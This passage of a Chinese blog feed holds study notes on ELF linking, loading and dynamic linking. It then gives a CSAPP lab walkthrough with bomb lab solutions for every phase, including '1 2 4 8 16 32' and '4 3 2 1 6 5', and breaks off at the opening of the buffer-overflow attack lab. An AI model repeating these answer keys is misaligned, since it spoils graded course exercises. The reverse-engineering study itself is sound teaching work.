class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elf32_Word st_name;<span class="comment">//符号名</span></span><br><span class="line">    Elf32_Addr st_value;<span class="comment">//符号值</span></span><br><span class="line">    Elf32_Word st_size;<span class="comment">//符号的数据类型大小</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;<span class="comment">//符号类型和绑定信息</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;<span class="comment">//没用，默认0</span></span><br><span class="line">    Elf32_Half st_shndx;<span class="comment">//符号所在段</span></span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure><p>符号类型和绑定信息<code>st_info</code>，该成员低4位表示符号类型，高28位表示符号绑定信息</p><p><img src="https://i.loli.net/2021/04/11/wUohbDBC5PzpW3T.png" alt="image-20210411153704495"></p><p>符号所在段<code>st_shndx</code></p><p><img src="https://i.loli.net/2021/04/11/DL3mr9fVkTWJby4.png" alt="image-20210411153836320"></p><p>符号值<code>st_value</code>，根据符号确定符号值，如果符号是个函数或者变量，符号值则是它的地址。</p><ul><li>在目标文件中，如果符号不是COMMON块的(<code>st_shndx</code>不为SHN_COMMON)，则符号值表示该符号在段中的偏移。</li><li>在目标文件中，如果符号是COMMON类型的，则符号值表示该符号的对齐属性</li><li>在可执行文件中，符号值表示符号的虚拟地址。</li></ul><p>&lt;————————————分割线————————————&gt;</p><p>特殊符号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__executable_start程序起始地址</span><br><span class="line">__etext或_etext或etext代码段结束地址</span><br><span class="line">_end或end程序结束地址</span><br></pre></td></tr></table></figure><p>我们可以在程序中直接使用这些符号</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> etext[];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;etext:%d&quot;</span>,etext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&lt;————————————分割线————————————&gt;</p><p>为了防止符号名冲突，不同语言的符号名规格也不一样，例如C语言的符号会在名字前面加上下划线，而Fortran语言会在前后都加上下划线。但是仍然会有符号名重复的事情，所以C++增加了<code>namespace</code>来解决冲突问题。</p><p>随着时间推移，Linux下的GCC编译器已经去掉了在C语言前加下划线的方式，但是Windows平台下的版本还会加下划线。</p><p>C++为了区分函数重载，发明了<strong>符号修饰</strong>的机制：</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">func</span><span class="params">(<span class="keyword">float</span>)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">C2</span>&#123;</span></span><br><span class="line">        <span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">namespace</span> N&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">C</span>&#123;</span></span><br><span class="line">        <span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数签名:函数签名包含了一个函数的信息，包括函数名，参数类型，所在的类和namespace及其他信息。</p><p>编译器将C++源代码编译成目标文件时，会将函数和变量名修饰后，再形成符号名。</p><p><img src="https://i.loli.net/2021/04/11/Y9LTOv2jflVnCBb.png" alt="image-20210411235604744"></p><blockquote><p>GCC的基本C++修饰方法如下：所有符号以<code>_Z</code>开头。然后嵌套的名字(在名称空间或在类里的)紧跟一个<code>N</code>，再以E结尾。每个名字前是名字字符串的长度，对于函数来说，它的参数列表紧跟在E后面，例如int类型就是i。</p><p><code>c++filt</code>这个工具可以用来解析被修饰过的名称</p></blockquote><p>全局变量和静态变量也会被修饰。不同编译器的修饰方法也是不同的。</p><h2 id="第四章-静态链接"><a href="#第四章-静态链接" class="headerlink" title="第四章 静态链接"></a>第四章 静态链接</h2><p>Q.对于多个输入目标文件，链接器如何将它们的各个段合并到输出文件？</p><ol><li>第一种方法是将输入的目标文件按次序叠加，但是缺点是目标文件很多的情况下，输出文件会有很多零散的段。因为对齐的原因，所以会浪费大量空间。</li><li>第二种方法是将相同性质的段合并在一起，现在的链接器也一般使用这种方法。使用这个方法的链接器一般采用一种<strong>两步链接</strong>的方法：第一步，<strong>空间与地址分配</strong>。扫描输入的目标文件，获取它们各个段的属性，将它们合并。并将符号表的所有符号定义和符号引用收集起来，统一放到一个全局符号表；第二步，使用上一步收集到的信息，进行<strong>符号解析与重定位</strong>。</li></ol><p>重定位表：</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elf32_Addr r_offset;</span><br><span class="line">    Elf32_Word r_info;</span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/12/Gspf9rNW1wjuXxP.png" alt="image-20210412143117240"></p><p><img src="https://i.loli.net/2021/04/12/FNZWBIsqAS4fLoc.png" alt="image-20210412145215215"></p><p>绝对地址修正和相对寻址修正的区别就是绝对寻址修正后的地址为该符号的实际地址；相对寻址修正后的地址为符号距离被修正位置的地址差。</p><h3 id="A-COMMON块"><a href="#A-COMMON块" class="headerlink" title="A.COMMON块"></a>A.COMMON块</h3><p>强符号：编译器默认函数和已经初始化的全局变量</p><p>弱符号：未初始化的全局变量</p><p>现在的编译器和链接器支持COMMON块（Common Block）机制。COMMON类型的链接规则是针对符号都是弱符号的情况。如果其中有一个强符号，最终符号所占空间与强符号相同。如果有弱符号大小大于强符号，链接器报警告。</p><p>COMMON块解决了一个弱符号定义在多个目标文件类型不同的问题。如果出现多个弱符号，两个文件链接后以最大的弱符号为准，例如是double类型，所占空间就为8个字节。</p><p>因为弱符号最终所占空间大小是未知的，所以无法为弱符号在BSS段分配空间。但是在链接器读取所有输入文件后，弱符号的大小就可以确定，所以还是存放在BSS段。</p><h3 id="B-C-相关问题"><a href="#B-C-相关问题" class="headerlink" title="B.C++相关问题"></a>B.C++相关问题</h3><p><strong>重复代码消除</strong>：C++编译器在很多时候会产生重复的代码，比如模板，外部内联函数和虚函数表等等，都有可能在不同的编译单元里生成相同的代码。为了防止空间浪费等等问题，我们把这些代码单独存放在一个段里，每个段只包含一个，最后合并代码段时去掉重复的。</p><p><strong>函数级别链接</strong>：由于现在的库和程序都很大，我们把函数单独保存到一个段里面，当我们用到的时候，把函数所在的段链接到输出文件就可以了。</p><p><strong>全局构造与析构</strong>：Linux系统下程序的入口是<code>_start</code>，这个函数是Glibc的一部分，当这个函数完成一系列初始化之后，才会调用main函数执行程序。main函数执行完后，又返回到<code>_start</code>，进行析构。除了这些以外，C++的全局构造和析构，也在main函数之前和之后执行。</p><ul><li><code>.init</code>该段保存可执行指令，构成进程的初始代码，在main函数调用之前，Glibc的初始化部分安排执行这个段的代码。</li><li><code>.fini</code>该段保存进程终止代码指令，当main函数正常退出时，Glibc会执行这个段指令。</li></ul><h2 id="第五章-Windows-PE-COFF"><a href="#第五章-Windows-PE-COFF" class="headerlink" title="第五章 Windows PE/COFF"></a>第五章 Windows PE/COFF</h2><p>之前写过PE相关的：<a href="https://kazamayc.github.io/2020/09/21/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-PE/">链接</a>，所以这章快进着看了</p><p>VC++编译器产生的目标文件格式是COFF，可执行文件格式是PE</p><blockquote><p>因为PE文件在装载时被直接映射到进程的虚拟空间中运行，它是进程的虚拟空间的映像，所以PE可执行文件很多时候被叫做Image File.</p></blockquote><p>本章主要讲了讲COFF文件格式，目前对其没什么兴趣，等之后用到再回来翻书。</p><h1 id="0x03-装载与动态链接"><a href="#0x03-装载与动态链接" class="headerlink" title="0x03 装载与动态链接"></a>0x03 装载与动态链接</h1><h2 id="第六章-可执行文件的装载与进程"><a href="#第六章-可执行文件的装载与进程" class="headerlink" title="第六章 可执行文件的装载与进程"></a>第六章 可执行文件的装载与进程</h2><h3 id="A-虚拟地址空间-Virtual-Address-Space"><a href="#A-虚拟地址空间-Virtual-Address-Space" class="headerlink" title="A.虚拟地址空间(Virtual Address Space)"></a>A.虚拟地址空间(Virtual Address Space)</h3><p>1.程序和进程的区别：程序是一个静态的概念，它是一些预先编译好的指令和数据集合的一个文件；进程则是一个动态的概念，它是程序运行时的过程。</p><p>2.虚拟地址空间的大小由CPU的位数决定，例如32位CPU有32位寻址能力，也就是4GB虚拟空间大小。</p><p>3.我们可以通过指针来判断虚拟空间位数，32位下的指针为32位，也就是4字节；64位下的指针为64位，8字节。</p><p>4.程序不能任意使用操作系统分配的虚拟空间，只能使用操作系统分配给进程的地址，如果访问未经允许的空间，操作系统会捕获访问并强制结束进程。<br>这里以32位举例，4GB会被分成两部分，从<code>0xC0000000</code>到<code>0xFFFFFFFF</code>这1GB由操作系统使用，剩下的从<code>0x00000000</code>到<code>0xBFFFFFFF</code>这3GB由进程使用。但其实这3GB进程也不能完全使用(太惨了)。</p><p>4.PAE(Physical Address Extension)：物理地址扩展，Intel改进CPU，扩展到36位地址线，可以映射更多内存。</p><h3 id="B-装载的方式"><a href="#B-装载的方式" class="headerlink" title="B.装载的方式"></a>B.装载的方式</h3><p>1.动态装入的基本原理：将程序常用的部分放在内存，不常用数据放在磁盘里面。</p><p>2.<strong>覆盖装入</strong>在早期没有虚拟存储时使用比较广泛，现在已经被淘汰了。覆盖装入的方法是让程序员将程序分割，然后写辅助代码来管理这些程序何时驻留内存何时被替换，这个辅助代码就是所谓的覆盖管理器。</p><p>3.<strong>页映射</strong>：程序把磁盘中的所有数据和指令按照页为单位划分成若干个页，以后所有的装载和操作的单位就是页。</p><p>4.页映射采用先进先出，最少使用算法。</p><h3 id="C-从操作系统的角度看可执行文件的装载"><a href="#C-从操作系统的角度看可执行文件的装载" class="headerlink" title="C.从操作系统的角度看可执行文件的装载"></a>C.从操作系统的角度看可执行文件的装载</h3><p>进程的建立：</p><ol><li>创建一个独立的虚拟地址空间</li><li>读取可执行文件头，建立虚拟空间和可执行文件的映射</li><li>将CPU的指令寄存器设置成可执行文件的入口地址</li></ol><p>Linux将进程虚拟空间中的一个段叫做虚拟内存区域(VMA, Virtual Memory Area)，在Windows里叫虚拟段(Virtual Section)</p><p><strong>页错误</strong>：当程序试图访问已映射在虚拟地址空间中，但是目前未被加载到物理内存，由中央处理器的内存管理单元所发出的中断。操作系统通过页错误来把虚拟地址空间加载到物理内存去执行。</p><p><img src="https://i.loli.net/2021/04/15/OrlkD2T4JAumHCY.png" alt="image-20210415184340491"></p><p>理解：计算机把可执行程序拉伸到虚拟地址空间，然后分页，实际的内存需要哪页，就给它哪页。</p><h3 id="D-进程的虚拟存储空间分布"><a href="#D-进程的虚拟存储空间分布" class="headerlink" title="D.进程的虚拟存储空间分布"></a>D.进程的虚拟存储空间分布</h3><p>1.操作系统不关心各个段的内容，只关心段的权限(可读可写可执行)。为了避免空间浪费，<strong>我们将相同权限的段合并到一起当作一个段进行映射</strong>，这种合成的段被看作是一个<code>Segment</code>，减少对齐导致的空间浪费(因为是先合并，然后再映射)。</p><blockquote><p>举个例子，<code>.text</code>被单独映射到一个虚拟段，<code>.data</code>也被单独映射到一个虚拟段，但如果他们两个权限相同，可以先把他俩合并成一个段，也就是Segment，然后再映射到虚拟段，这样可以节省内存。</p></blockquote><p>描述section属性的叫做段表，描述segment的程序叫程序头表。</p><p>ELF可执行文件中有一个专门的数据结构保存Segment的信息。</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elf32_Word p_type;<span class="comment">//Segment类型</span></span><br><span class="line">  Elf32_Off p_offset;<span class="comment">//在文件中的偏移</span></span><br><span class="line">  Elf32_Addr p_vaddr;<span class="comment">//第一个字节在进程虚拟地址空间的起始位置</span></span><br><span class="line">    Elf32_Addr p_paddr;<span class="comment">//物理地址</span></span><br><span class="line">    Elf32_Word p_filesz;<span class="comment">//在ELF文件中占空间的长度</span></span><br><span class="line">    Elf32_Word p_memsz;<span class="comment">//在虚拟空间中占用的长度</span></span><br><span class="line">    Elf32_Word p_flags;<span class="comment">//权限属性RWX</span></span><br><span class="line">    Elf32_Word p_align;<span class="comment">//对齐属性，实际对其字节是2的p_align次，比如p_align等于10，那么实际对齐属性就是2的10次方</span></span><br><span class="line">&#125;Elf32_Phdr;</span><br></pre></td></tr></table></figure><p>2.操作系统通过给进程空间划分出一个个的VMA来管理进程的虚拟空间，基本原则是将相同权限属性、有相同映像文件的映射成一个VMA。</p><p><img src="https://i.loli.net/2021/04/15/8LsH3SEDkzxNKaX.png" alt="image-20210415200652636"></p><p>3.进程在启动时，需要知道一些进程运行的环境，最基本的就是系统环境变量和进程的运行参数。很常见的一种做法是操作系统在进程启动前将这些信息保存到进程的虚拟空间的栈中。</p><h3 id="E-Linux内核装载ELF过程"><a href="#E-Linux内核装载ELF过程" class="headerlink" title="E.Linux内核装载ELF过程"></a>E.Linux内核装载ELF过程</h3><p>Q.当我们在bash下输入命令执行ELF程序时，Linux系统会怎么做呢？</p><p>A：首先在用户层面上，bash进程会调用fork()系统调用创建一个新的进程，然后新的进程调用execve()系统调用执行指定的ELF文件，原先的bash进程返回等待启动的进程结束。<br>在内核中，execve()系统调用sys_execve()对参数进行检查复制，然后调用do_execve()查找被执行的文件，如果找到文件就读取文件的前128字节(用以接下来判断文件的格式)。然后调用search_binary_handle()去搜索和匹配合适的可执行文件装载处理过程，search_binary_handle()会判断文件格式，调用相应的装载处理过程。比如ELF就会调用load_elf_binary()，a.out就调用load_aout_binary()。</p><p>load_elf_binary()的步骤是：</p><ol><li>检查ELF可执行文件格式的有效性</li><li>寻找动态链接<code>.interp</code>段，设置动态链接器路径</li><li>根据ELF可执行文件的程序头表的描述，对ELF文件进行映射</li><li>初始化ELF进程环境</li><li>将系统调用的返回地址修改成ELF可执行文件的入口点</li></ol><p>当load_elf_binary()执行完毕，返回至do_execve()再返回至sys_execve()，系统调用的返回地址已经被修改成ELF的入口地址，这时EIP寄存器跳转到入口地址，新的程序开始执行。</p><h3 id="F-Windows-PE的装载"><a href="#F-Windows-PE的装载" class="headerlink" title="F.Windows PE的装载"></a>F.Windows PE的装载</h3><p>Windows不需要考虑ELF多段地址对齐之类的问题，虽然会浪费一些磁盘和内存，不过PE的段一般比较少，不像ELF中有很多，最后还要用Segment把它们合并到一起装载。</p><p>PE的装载过程：</p><ol><li>先读取文件第一个页</li><li>检查进程地址空间中，目标地址是否可用。不可用就选另一个装载地址。这个问题对可执行文件基本上不存在，因为它往往是进程第一个装入的模块，主要针对于DLL文件的装载。</li><li>使用段表中提供的信息，将PE文件中的所有段一一映射到地址空间</li><li>如果装载地址不是目标地址，则进行重定位</li><li>装载所有PE文件所需要的DLL文件</li><li>对PE文件中的所有导入符号进行解析</li><li>根据PE头中指定的参数建立初始化栈和堆</li><li>建立主线程并启动</li></ol><h2 id="第七章-动态链接"><a href="#第七章-动态链接" class="headerlink" title="第七章 动态链接"></a>第七章 动态链接</h2><p>1.静态链接的缺点是浪费内存和磁盘空间，模块更新困难。</p><p>2.动态链接的基本思想是把程序按照模块分成各个独立的部分，在程序运行时将它们链接在一起，而不是像静态链接一样把所有的程序模块都链接成一个单独的可执行文件。</p><p>3.动态链接优点：能够节省内存，有更好的程序扩展性和兼容性。</p><p>4.动态链接的缺点：当程序依赖某个模块更新后，由于新的模块和旧的模块不兼容，导致程序无法运行，也被称为DLL Hell。</p><p>5.如果a函数是一个定义在其他静态模块的函数，那么链接器会将a函数的地址重定位；如果a函数是一个定义在动态共享对象的函数，那么链接器就会将这个符号标记为一个动态链接的符号，不对它进行地址重定位，把这个过程留到装载时再进行。</p><p>6.可执行文件基本可以确定自己再进程虚拟空间的起始位置，Linux下一般是0x08040000，Windows下一般是0x0040000。</p><p>7.**地址无关代码(PIC)**：希望程序模块中共享的指令部分在装载时不需要因为装载地址的改变而改变，所以实现的基本想法就是把指令中那些需要被修改的部分分离出来，跟数据部分放在一起，这样指令的部分就可以保持不变，而数据部分可以在每个进程中拥有一个副本。</p><p>8.**全局偏移表GOT(Global Offset Table)**是链接器在执行链接时实际上要填充的部分， 保存了所有外部符号的地址信息。动态链接时，因为不知道模块加载位置，将地址相关代码抽出，放在数据段中就是got表。</p><p>9.<strong>延迟绑定(Lazy Binding)<strong>：当函数第一次被用到时才进行绑定。能加快速度，因为有些函数不会用到。</strong>绑定需要进行符号查找和重定位，如果用延迟绑定就不需要把所有的函数进行绑定了。</strong></p><p>10.**PLT(Procedure Linkage Table)**：ELF使用PLT的方法进行延迟绑定，PLT为了实现延迟绑定，当调用外部模块的函数时，不直接通过GOT表进行间接跳转，而是在这个过程中又加了一层间接跳转PLT表。</p><p><img src="https://i.loli.net/2021/04/22/N7TknDldQ9zPVfv.png" alt="image-20210422005334405"></p><p>PLT将GOT拆分成了两个表叫做”<code>.got</code>“和”<code>.got.plt</code>“，<code>.got</code>用来保存全局变量引用的地址，<code>.got.plt</code>用来保存函数引用的地址。</p><p>对应这篇文章一起理解,<a href="https://aidaip.github.io/binary/2019/10/25/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html">https://aidaip.github.io/binary/2019/10/25/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html</a></p><p>11.生成动态链接库<code>gcc -fPIC -shared demo.c demo.so</code></p><p>12.静态链接下，操作系统可以直接把控制权交给可执行文件的入口地址，然后程序开始执行。但是动态链接下，操作系统会启动动态链接器<code>ld.so</code>，当所有动态链接工作完成之后，才会把控制权交给可执行文件的入口。</p><p>13.<code>.inertp</code>段保存了一个字符串，这个字符串就是可执行文件所需要的动态链接器的路径。</p><p>14.<code>.dynamic</code>段保存了动态链接所需要的基本信息。</p><p>15.<code>.rel.dyn</code>表示代码段(修正<code>.got</code>)的重定位表，<code>.rel.data</code>是数据段(修正<code>.got.plt</code>)的重定位表。</p><p>16.动态链接步骤：启动动态链接器，动态链接器自己把自己本身的函数进行重定位。接下来把符号表合并到一个里面，然后装载所有需要的共享对象，最后重定位和初始化。</p>]]></content>
      
      
      <categories>
          
          <category> 2021年3月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[实验] csapp_lab</title>
      <link href="/2021/02/05/csapp-lab/"/>
      <url>/2021/02/05/csapp-lab/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-bomb-lab"><a href="#0x01-bomb-lab" class="headerlink" title="0x01 bomb lab"></a>0x01 bomb lab</h1><p>#如果有写错的或不懂的，欢迎加我讨论一下<br>#后面几个因为挺难注释写的挺乱的，建议不要看自己调试一遍，调不出看看总结的思路即可</p><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p>因为本题需要用gdb，于是先去琢磨了一下gdb的使用。</p><p>上来先把汇编导出来</p><p><img src="https://i.loli.net/2021/02/05/XIt1F2Q5pqlwa3U.png" alt="image-20210205004018515"></p><p>然后拖到vscode里，找到第一个函数，然后简单分析一下</p><p><img src="https://i.loli.net/2021/02/05/x57HKdpMYf1Zyu9.png" alt="image-20210205004931811"></p><p>然后打开gdb在比较字符串的地方设置断点，然后运行，运行后随便输入，进入断点。</p><p><img src="https://i.loli.net/2021/02/05/k4KWpsaiyGmx5ZY.png" alt="image-20210205005109996"></p><p>然后查看第一个参数rdi的内容，发现是我们输入的参数</p><p><img src="https://i.loli.net/2021/02/05/DNIdzfihS1coQtr.png" alt="image-20210205005553988"></p><p>于是推测esi中的数据是用来跟我们输入的数据比较的</p><p><img src="https://i.loli.net/2021/02/05/giomXZ2EC9shrAq.png" alt="image-20210205005707665"></p><p>然后测试</p><p>Border relations with Canada have never been better.</p><p><img src="https://i.loli.net/2021/02/06/VEQNXFMmoeShHry.png" alt="image-20210206230552676"></p><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>首先看汇编推测是读取6个数字</p><p><img src="https://i.loli.net/2021/02/06/QUk9olvITt4EOB8.png" alt="image-20210206231007803"></p><p>然后读读汇编会发现第一个数是1，第二数在rax里，剩下的数是个等比数列</p><p><img src="https://i.loli.net/2021/02/07/3fhXO4VdS6Usomr.png" alt="image-20210207010610656"></p><p>也就是1 2 4 8 16 32</p><p><img src="https://i.loli.net/2021/02/07/f14kcDj8LSUoZIC.png" alt="image-20210207010740967"></p><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><p><img src="https://i.loli.net/2021/02/07/2vRFdq5ykm8EZ3n.png" alt="image-20210207012840994"></p><p>带入0测试一下，看看0x402470里面存放的值</p><p><img src="https://i.loli.net/2021/02/07/ZUTRuNsjPh7vB6A.png" alt="image-20210207012828613"></p><p><img src="https://i.loli.net/2021/02/07/5BjNkfWHqQ6y9xZ.png" alt="image-20210207013249509"></p><p>于是接着分析</p><p><img src="https://i.loli.net/2021/02/07/HwkVipgXe8R7Zt3.png" alt="image-20210207015926457"></p><p>两个数是0 207</p><p><img src="https://i.loli.net/2021/02/07/VqeHIx63RJ2f5Bu.png" alt="image-20210207020029327"></p><p>搞定</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><p><img src="https://i.loli.net/2021/02/11/LeKA6uFgCVEJTsq.png" alt="image-20210211013148726"></p><p><img src="https://i.loli.net/2021/02/11/3Vv9SpYODMsiQco.png" alt="image-20210211013159583"></p><p>所以答案应该是7 0</p><p><img src="https://i.loli.net/2021/02/11/ehv6HSp37iAERdX.png" alt="image-20210211013357678"></p><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><p>第五关只看汇编做不出来，要接着上gdb（下面几个有点复杂，写的废话有点多，见谅见谅QAQ</p><p>先粗略分析一下</p><p><img src="https://i.loli.net/2021/02/11/Pil3wREdTGjsH2t.png" alt="image-20210211144109197"></p><p>查看用于比较的字符串是”<code>flyers</code>“</p><p><img src="https://i.loli.net/2021/02/11/jrZh6xg7MNonzE4.png" alt="image-20210211144522857"></p><p>结果爆炸了</p><p><img src="https://i.loli.net/2021/02/11/bOPNM3uKtB9zjr1.png" alt="image-20210211144807960"></p><p>设个断点调一下</p><p><img src="https://i.loli.net/2021/02/11/jpOLZFTeE7YVC5J.png" alt="image-20210211164833577"></p><p>rbx中是我们输入的值</p><p><img src="https://i.loli.net/2021/02/11/zHDwMV2jAGylU6X.png" alt="image-20210211165134962"></p><p>然后就可以接着推源代码了</p><p><img src="https://i.loli.net/2021/02/11/NVr7R62OoyXeDwd.png" alt="image-20210211173117782"></p><p>然后看一看0x4024b0地址中存的东西</p><p><img src="https://i.loli.net/2021/02/11/ftPrS7qIZiBGAvO.png" alt="image-20210211173439286"></p><p>然后因为太菜，一步一步的测试分析的，写的可能有点多，思路都在注释里了</p><p><img src="https://i.loli.net/2021/02/11/deXcC1GNnE6HVoY.png" alt="image-20210211195320442"></p><p>经过俺的反复理解，这里应该是要用0x4024b0处的字符串凑出flyers这个值即可(大概x</p><p>然后只要研究一下如何让咱输入的值满足这个条件即可</p><p>话说edx的值大概是索引1，f需要的值是9，l是15，y是14，e是5，r是6，s是7</p><p>所以需要的值大概是让输入每个字符的ascii的值后四位为9FE567</p><p>查查ASCII码表 用 9ON567测试一下</p><p><img src="https://i.loli.net/2021/02/11/VrDb2qoKz6ZXch3.png" alt="image-20210211201145392"></p><p><img src="https://i.loli.net/2021/02/11/EazZkcw91jJMNem.png" alt="image-20210211200851162"></p><p>成了，泪目</p><p>备注：0x401096注释部分是错的，是我在分析时没注意abcdef，后面换了几个值测试才成功，记得下次测试时用点特殊值</p><p><img src="https://i.loli.net/2021/02/11/cNw8ePyRIgQ54lk.png" alt="image-20210211202857311"></p><p>这里值还是很奇怪，不过只要看最后8位就能看出答案</p><p><img src="https://i.loli.net/2021/02/11/KXtT2g6FHNUC4EA.png" alt="image-20210211202942318"></p><p>变成9啦，前面应该是把寄存器之前的值加进去了</p><p>然后再读一遍代码就能懂啦，简单哒</p><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>这个还挺复杂的，主要是理清楚逻辑（犯了一个低级错误导致浪费了两天才调出来，但这个其实并不难，调试一下就出来了</p><p>经过上个的教训，输入些不规则的数</p><p><img src="https://i.loli.net/2021/02/11/ALvQRa7dU2SuKGZ.png" alt="image-20210211204818126"></p><p>栈中是我们输入的参数</p><p><img src="https://i.loli.net/2021/02/11/FJcUleM32tmQduP.png" alt="image-20210211205338947"></p><p>最终分析大概是这样：</p><p><img src="https://i.loli.net/2021/02/13/unXchFOzEL6Dfxl.png" alt="image-20210213003347640"></p><p>其实也不用看我的注释，前面主要就是让你输入6个参数，且6个参数需要&gt;=1且&lt;=6，并且不能相同。</p><p>直接输入654321会爆炸，不过为了测试下面代码，先把输入的值改成654321</p><p><img src="https://i.loli.net/2021/02/11/Fa7RCSmDYth3xjN.png" alt="image-20210211223154741"></p><p><img src="https://i.loli.net/2021/02/13/nyTPcoOJU3iQlaR.png" alt="image-20210213012115782"></p><p>这里是把<code>0x6032d0（332 1 6）</code> <code>0x6032e0（168 2 5）</code> <code>0x6032f0（924 3 4）</code> <code>0x603300（691 4 3）</code> <code>0x603310（477 5 2）</code> <code>0x603320（443 6 1）</code>共6个地址按照你输入的顺序放到栈上</p><p><img src="https://i.loli.net/2021/02/13/IB51k2zOh38bVv7.png" alt="image-20210213015400190"></p><p>因为我们输入的是654321</p><p>所以栈中应该是这样的：</p><p><img src="https://i.loli.net/2021/02/13/M4T5PW91HNu36gq.png" alt="image-20210213013030596"></p><p>然后就是<img src="https://i.loli.net/2021/02/13/3PAHDEIaq6fThRS.png" alt="image-20210213022121426"></p><p>可以得到d8存e0，e8存f0……20存0</p><p><img src="https://i.loli.net/2021/02/13/hXBq2IpPzUCyRkc.png" alt="image-20210213030646430"></p><p>根据前面的332 168 924等进行排序，然后算出答案应该是4 3 2 1 6 5</p><p><img src="https://i.loli.net/2021/02/13/6TXHwAyGuqd1LPe.png" alt="image-20210213030945318"></p><p>然后就做完了</p><p>备注：这个做的有些吃力，做完了看别人blog发现这原来是个链表…</p><h1 id="0x02-Attack-lab"><a href="#0x02-Attack-lab" class="headerlink" title="0x02 Attack lab"></a>0x02 Attack lab</h1><p>这个题要先去看看他的要求：<a href="http://csapp.cs.cmu.edu/3e/README-attacklab">http://csapp.cs.cmu.edu/3e/README-attacklab</a></p><p><a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">http://csapp.cs.cmu.edu/3e/attacklab.pdf</a></p><p>这个lab给了这些程序</p><p><img src="https://i.loli.net/2021/02/13/kOKdeBwWhsn9vcb.png" alt="image-20210213153141963"></p><p>另外执行程序时要加入参数<code>-q</code>，否则会报错</p><p><img src="https://i.loli.net/2021/02/13/GXNmEAOgJYZW53R.png" alt="image-20210213161230555"></p><h2 id="code-injection"><a href="#code-injection" class="headerlink" title="code-injection"></a>code-injection</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>第一题是让你执行getbuf()时，调用touch1的代码</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = <span class="built_in">getbuf</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cc"><table><tr><td 